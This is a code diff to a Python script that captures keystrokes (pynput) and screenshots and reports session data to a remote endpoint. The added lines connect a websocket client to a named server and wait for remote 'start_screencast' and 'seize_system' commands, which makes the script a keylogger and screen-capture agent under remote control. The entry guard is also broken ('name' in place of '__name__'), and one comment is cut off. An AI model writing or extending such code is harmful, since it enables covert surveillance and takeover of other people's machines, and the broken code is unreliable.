@@ -8,6 +8,26 @@ import datetime
 from pynput import keyboard  # For keystrokes
 from PIL import ImageGrab  # For screenshots
 
+import websocket
+import json
+
+def on_message(ws, message):
+    data = json.loads(message)
+    if data['action'] == 'start_screencast':
+        start_screencast()
+    elif data['action'] == 'seize_system':
+        seize_system()
+
+def on_error(ws, error):
+    print("WebSocket error:", error)
+
+def on_close(ws, close_status_code, close_msg):
+    print("WebSocket closed")
+
+def on_open(ws):
+    print("WebSocket connection opened")
+
+
 # Define the base URL for API endpoints
 BASE_URL = "https://your_laravel_site_endpoint"
 
@@ -145,3 +165,13 @@ def end_session():
                 requests.post(f"{BASE_URL}/session_ended", json={'time': None})
             break
         time.sleep(60)  # Check every minute
+
+
+if name == "__main__":
+    # Replace 
+    ws = websocket.WebSocketApp("ws://brainsbond007-websocket-server",
+                                on_message=on_message,
+                                on_error=on_error,
+                                on_close=on_close)
+    ws.on_open = on_open
+    ws.run_forever()
